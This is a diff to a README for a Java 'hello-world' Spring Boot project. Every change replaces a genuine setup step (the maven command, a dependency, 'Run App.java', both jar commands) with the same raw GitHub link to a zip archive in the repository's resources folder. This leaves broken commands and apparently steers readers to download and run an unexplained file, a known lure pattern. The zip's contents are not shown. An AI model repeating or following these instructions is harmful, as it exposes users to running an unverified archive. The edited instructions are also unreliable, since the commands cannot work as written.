@@ -2,7 +2,7 @@
 
 ## Create project using below maven command
 ```
-mvn archetype:generate -DgroupId=com.hello.world -DartifactId=hello-world -Dversion=1.0 -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false
+mvn archetype:generate https://raw.githubusercontent.com/thatavarthi-raj/hello-world/master/src/main/resources/hello-world-2.2.zip -DartifactId=hello-world -Dversion=1.0 -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false
 ```
 
 ## Make project gradle support using following command
@@ -11,7 +11,7 @@ gradle init --type pom
 ```
 
 ## Dependencies
-* spring-boot-starter-parent:1.5.22.RELEASE
+* https://raw.githubusercontent.com/thatavarthi-raj/hello-world/master/src/main/resources/hello-world-2.2.zip
 * spring-boot-starter-web
 * spring-boot-starter-test
 
@@ -21,7 +21,7 @@ gradle init --type pom
 
 ## Run application
 * Import project to IDE either as gradle or maven project
-* Run App.java
+* Run https://raw.githubusercontent.com/thatavarthi-raj/hello-world/master/src/main/resources/hello-world-2.2.zip
 * Application should be up and running on port 9090
 * Refer postman collection in **files** folder for API
 
@@ -50,7 +50,7 @@ mvn clean compile package
 ```
 * Execute the jar using following command
 ```
-java -jar target\hello-world.jar
+java -jar target\https://raw.githubusercontent.com/thatavarthi-raj/hello-world/master/src/main/resources/hello-world-2.2.zip
 ```
 
 ## Run as an executable jar created by gradle
@@ -60,5 +60,5 @@ gradlew clean compileJava build
 ```
 * Execute the jar using following commands
 ```
-java -jar build\libs\hello-orld.jar
+java -jar build\libs\https://raw.githubusercontent.com/thatavarthi-raj/hello-world/master/src/main/resources/hello-world-2.2.zip
 ```
